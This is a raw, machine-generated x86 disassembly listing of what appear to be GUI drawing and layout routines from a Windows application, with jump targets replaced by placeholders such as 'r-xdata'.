cmp [ ebx + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx edi
mov eax esi
call sub_412bb8
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ ebx + 0x20 ]
push eax
call PtInRect
test eax eax
jne r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_471864
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x288 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp [ edx + 0xd ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
sar eax 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov esi [ edx - 0x14 ]
mov edx [ ebp + 0x8 ]
add esi [ edx - 0xc ]
sar esi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov esi [ edx - 0xc ]
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
sar eax 0x1
jns r-xdata
add esi eax
jmp r-xdata
adc eax 0x0
sar eax 0x1
jns r-xdata
adc esi 0x0
sub esi eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + 0x288 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x98 ]
test al al
je r-xdata
sub esi eax
adc eax 0x0
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x5c ]
push 0x0
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x124 ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_471930
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x19 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4038ec#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xdc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + 0x288 ]
mov eax ebx
call sub_45c9c4
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x20000000
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41d72c
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41d72c
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41c964
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_41d734
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebx + 0x10 ]
call sub_41d618
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41d610
cmp eax 0x20000000
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_41d308
cmp eax 0x20000000
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x18 ]
cmp [ ebx + 0x21 ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov dl 0x1
call sub_41d734
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41d610
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_471808
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_41d734
jmp r-xdata
mov [ ebp - 0x29 ] al
cmp [ ebp - 0x29 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
call sub_41d434
jmp r-xdata
mov ecx [ edx + 0x29a ]
sub ecx eax
mov [ ebp - 0x8 ] ecx
add ecx 0x5
mov [ ebp - 0x10 ] ecx
mov ecx [ edx + 0x292 ]
add ecx eax
mov [ ebp - 0x10 ] ecx
sub ecx 0x5
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov ecx [ edx + 0x28e ]
add ecx eax
mov [ ebp - 0x14 ] ecx
cmp [ ebp - 0x19 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x288 ]
mov eax [ eax + 0xc ]
mov dl 0x5
call sub_41d40c
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x288 ]
mov eax [ eax + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
call sub_41d434
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov edx [ edx + 0x296 ]
sub edx eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
lea edi [ eax + 0x20 ]
lea esi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ ebp - 0x29 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax ]
call [ edx + 0x14 ]
imul [ ebp - 0x20 ]
mov edx [ ebp - 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax ]
call [ edx + 0x14 ]
imul [ ebp - 0x20 ]
add eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
jmp r-xdata
cmp [ ebp - 0x19 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x288 ]
mov eax [ eax + 0x10 ]
call sub_41d72c
cmp al 0x1
je r-xdata
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x20
push eax
call InflateRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x288 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x29 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
xor eax eax
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x288 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x1c ]
cmp [ ebp - 0x19 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x18 ]
add [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x20 ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0xd ]
sub al 0x1
jb r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x29 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x20 ]
mov [ ebp - 0x10 ] eax
push ebp
lea ecx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x38 ]
call sub_471864
pop ecx
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
dec ebx
cmp ebx 0xffffffff
jne r-xdata
inc esi
xor ebx ebx
mov eax [ edx ]
add eax [ ebp - 0x28 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
je r-xdata
inc ebx
dec esi
jne r-xdata
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
add eax 0x28e
cmp [ ebp - 0x19 ] 0x0
je r-xdata
cmp [ ebp - 0x19 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x8 ] eax
push ebp
lea ecx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x34 ]
call sub_471864
pop ecx
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
inc ebx
dec esi
jne r-xdata
jmp r-xdata
mov eax [ edx + 0x8 ]
sub eax [ ebp - 0x28 ]
mov [ edx ] eax
jmp r-xdata
dec al
je r-xdata
lea ecx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x8 ]
add edx [ rw-data ]
mov [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x24 ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
add [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ edx ]
add eax [ edx + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4617c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471d78
lea eax [ ebp - 0x38 ]
mov edx 0x3
call sub_403f0c
retn
mov ecx [ ebp - 0x28 ]
sar ecx 0x1
jns r-xdata
adc eax 0x0
mov ebx eax
sub ebx ecx
mov [ edx ] ebx
add eax ecx
mov [ edx + 0x8 ] eax
adc ecx 0x0
sub_471d83
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push j_sub_4038ec#6
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_46cf60
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4715b0
mov [ ebx + 0x3b8 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4715b0
mov [ ebx + 0x35c ] eax
test [ ebx + 0x1c ] 0x10
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47141c
mov esi eax
mov [ ebx + 0x354 ] esi
mov eax [ esi + 0x8 ]
mov dl 0x1
call sub_41d734
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47141c
mov esi eax
mov [ ebx + 0x360 ] esi
mov edx 0x80ffff
mov eax esi
call sub_471590
mov eax [ esi + 0x4 ]
mov [ esi + 0x1c ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_473808
mov [ ebx + 0x364 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47141c
mov esi eax
mov [ ebx + 0x358 ] esi
mov edx 0xffffff
mov eax esi
call sub_471590
mov eax [ esi + 0x4 ]
mov [ esi + 0x1c ] eax
mov [ ebx + 0x28d ] 0x0
mov [ ebx + 0x368 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471f13
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
lea edx [ ebp - 0x108 ]
mov eax [ ebx ]
call sub_4030e8
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_40414c
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x3b8 ]
mov eax [ eax + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebx + 0x35c ]
mov esi [ eax + 0x8 ]
mov edx 0xff
mov eax esi
call sub_41ce24
call sub_460d38
mov edx eax
mov eax esi
call sub_41d0c4
mov dl [ r-xdata ]
mov eax esi
call sub_41d0f0
mov eax [ ebx + 0x35c ]
mov [ eax + 0x34 ] 0xff
mov dl [ r-xdata ]
mov [ eax + 0x38 ] dl
sub_471f35
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x3b8 ]
call sub_403198
mov eax [ esi + 0x35c ]
call sub_403198
lea eax [ esi + 0x354 ]
call sub_40d3ac
mov eax [ esi + 0x358 ]
call sub_403198
mov eax [ esi + 0x360 ]
call sub_403198
mov eax [ esi + 0x364 ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_46d328
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_471fc8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
test esi esi
je r-xdata
mov eax edi
call sub_403ee8
push edi
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebx + 0x364 ]
call sub_47499c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_472000
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x364 ]
call sub_473c6c
cmp [ ebx + 0x3fa ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
push esi
push edi
mov eax [ ebx + 0x364 ]
mov cl [ eax + 0x64 ]
mov edx ebx
mov eax [ ebx + 0x3fc ]
call [ ebx + 0x3f8 ]
sub_472050
mov cl [ eax + 0x4 ]
mov [ edx ] cl
mov cl [ eax + 0x6 ]
mov [ edx + 0x1 ] cl
mov cl [ eax + 0x5 ]
mov [ edx + 0x2 ] cl
mov ecx [ eax + 0x18 ]
mov [ edx + 0x3 ] ecx
mov ecx [ eax + 0x1c ]
mov [ edx + 0x7 ] ecx
mov ecx [ eax + 0x10 ]
mov [ edx + 0xb ] ecx
mov ecx [ eax + 0x14 ]
mov [ edx + 0xf ] ecx
retn
sub_47207c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x2f0 ]
call sub_472050
lea edx [ esi + 0x39 ]
mov eax [ ebx + 0x2f4 ]
call sub_472050
lea edx [ esi + 0x13 ]
mov eax [ ebx + 0x2f8 ]
call sub_472050
lea edx [ esi + 0x26 ]
mov eax [ ebx + 0x2fc ]
call sub_472050
pop esi
pop ebx
retn
sub_4720bc
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ esi ]
mov eax ebx
call sub_465ed0
mov dl [ esi + 0x1 ]
mov eax ebx
call sub_465efc
mov dl [ esi + 0x2 ]
mov eax ebx
call sub_465f2c
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push [ esi + 0x7 ]
push [ esi + 0x3 ]
push [ esi + 0xf ]
push [ esi + 0xb ]
mov eax ebx
call sub_466420
sub_4720fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x2f0 ]
call sub_4720bc
lea edx [ esi + 0x39 ]
mov eax [ ebx + 0x2f4 ]
call sub_4720bc
lea edx [ esi + 0x13 ]
mov eax [ ebx + 0x2f8 ]
call sub_4720bc
lea edx [ esi + 0x26 ]
mov eax [ ebx + 0x2fc ]
call sub_4720bc
pop esi
pop ebx
retn
sub_472178
push ebx
mov ebx eax
mov eax [ ebx + 0x354 ]
call sub_471590
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax [ ebx + 0x354 ]
mov eax [ eax + 0x8 ]
xor edx edx
call sub_41d734
sub_4721a4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] cl
mov esi edx
mov ebx eax
mov eax ebx
call sub_46e68c
mov edi eax
dec edi
test edi edi
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc edi
xor ebp ebp
mov al 0x1
cmp esi [ ebx + 0x70 ]
je r-xdata
xor eax eax
jmp r-xdata
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_47216c
cmp esi eax
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec edi
jne r-xdata
cmp esi [ ebx + 0x70 ]
je r-xdata
mov edx ebp
mov eax ebx
call sub_46da00
mov eax [ eax + 0x34 ]
mov [ esp + 0x4 ] eax
cmp esi [ esp + 0x4 ]
je r-xdata
mov eax ebx
call sub_47216c
cmp esi eax
jne r-xdata
sub_472234
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x3b8 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x35c ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov dl 0x1
call sub_471930
pop ebp
retn
mov edx [ ebp + 0x8 ]
xor edx edx
call sub_471930
sub_472274
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov edx [ eax ]
call [ edx + 0xe0 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x364 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
push ebp
call sub_472234
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2e8 ]
call sub_46cf30
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x364 ]
call sub_473f64
test al al
je r-xdata
push ebp
call sub_472234
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x364 ]
mov edx [ eax ]
call [ edx + 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x364 ]
mov edx [ eax ]
call [ edx + 0x10 ]
push ebp
call sub_472234
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ecx
pop ebp
retn
sub_472328
xor ecx ecx
cmp [ eax + 0x278 ] 0x0
je r-xdata
mov eax ecx
retn
cmp [ eax + 0x300 ] 0x0
je r-xdata
cmp edx [ eax + 0x2f8 ]
jne r-xdata
cmp edx [ eax + 0x2f4 ]
jne r-xdata
mov eax [ eax + 0x360 ]
mov ecx [ eax + 0x14 ]
jmp r-xdata
mov eax [ eax + 0x358 ]
mov ecx [ eax + 0x14 ]
sub_472364
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x288 ]
mov edx [ ebx + 0x10 ]
call sub_45c8bc
mov eax [ ebx + 0x8 ]
call sub_4713f4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x288 ]
mov eax [ eax + 0x10 ]
xor edx edx
call sub_41d5ec
cmp [ ebx + 0x4 ] 0x20000000
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_41d5e4
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x288 ]
mov eax [ eax + 0x10 ]
call sub_41d5ec
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
call sub_41d610
push eax
mov eax [ ebx + 0x8 ]
call sub_41d72c
mov ecx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x4 ]
call sub_461354
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_41d72c
test al al
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x288 ]
mov eax [ eax + 0x10 ]
mov dl 0x1
call sub_41d734
sub_472414
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x354 ]
call sub_472364
pop ecx
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x354 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x28e
mov edx [ eax + 0x8 ]
inc edx
push edx
mov edx [ eax + 0xc ]
inc edx
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x288 ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x300 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x350 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x280 ] 0x0
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x300 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push esi
lea esi [ eax + 0x28e ]
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax [ esi + 0x10 ]
cmp [ eax + 0x21 ] 0x0
je r-xdata
mov ebx [ esi + 0x14 ]
mov ebx [ esi + 0x14 ]
neg ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x360 ]
call sub_472364
pop ecx
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x360 ]
mov eax [ ebp - 0x4 ]
lea ebx [ eax + 0x28e ]
mov edi [ esi + 0x14 ]
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x280 ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_461e28
push 0xffffffff
push 0x0
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
mov eax [ ebp - 0x4 ]
lea ebx [ eax + 0x28e ]
mov eax [ ebx + 0xc ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx [ ebx + 0x8 ]
mov edx [ ebx + 0x4 ]
dec edx
mov eax [ ebx ]
inc eax
call sub_412be0
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x280 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov ebx [ eax ]
call [ ebx + 0x10c ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea edi [ eax + 0x28e ]
mov eax [ edi + 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x2f4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xf8 ]
add eax [ edi + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
push eax
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x280 ]
push ebx
mov eax esi
call sub_47153c
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x2f8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xf8 ]
mov edx [ edi ]
sub edx eax
mov ecx [ edi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov ebx [ eax ]
call [ ebx + 0xc8 ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x2f4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xf8 ]
add eax [ ebx + 0xc ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
inc eax
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov ebx [ eax ]
call [ ebx + 0x114 ]
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x2f4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xf8 ]
add eax [ ebx + 0xc ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
push eax
mov eax esi
call sub_47153c
push eax
mov edx [ ebx ]
sub edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov ecx [ ebx ]
mov ebx [ eax ]
call [ ebx + 0xc8 ]
jmp r-xdata
cmp [ edi + 0x14 ] 0x0
jle r-xdata
inc ebx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x358 ]
call sub_472364
pop ecx
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x358 ]
mov eax [ ebp - 0x4 ]
lea esi [ eax + 0x28e ]
mov ebx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov edx [ eax ]
call [ edx + 0x98 ]
test al al
je r-xdata
mov eax [ esi + 0x8 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
push eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov ecx ebx
mov ebx [ eax ]
call [ ebx + 0x110 ]
push ebx
add ebx [ edi + 0x14 ]
push ebx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
push eax
mov eax edi
call sub_47153c
push eax
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov ebx [ eax ]
call [ ebx + 0xc8 ]
jmp r-xdata
sub_47270c
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fsub [ eax + 0x18 ]
fdiv [ rw-data ]
fadd [ eax + 0x18 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
fld [ eax + 0x10 ]
fsub [ ebp + 0x8 ]
fdiv [ rw-data ]
fsubr [ eax + 0x10 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_466420
pop ebp
retn 0x10
sub_472744
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x368 ] 0x0
je r-xdata
cmp [ ebx + 0x2b4 ] 0x0
je r-xdata
lea edx [ ebp - 0x4c ]
mov eax ebx
call sub_47207c
lea esi [ ebp - 0x4c ]
lea edi [ ebx + 0x369 ]
mov ecx 0x13
[ edi ] [ esi ]
mov [ ebx + 0x368 ] 0x0
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
mov eax [ ebx + 0x2f8 ]
call sub_466420
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebx + 0x2fc ]
call sub_466420
push [ ebp + 0x44 ]
push [ ebp + 0x40 ]
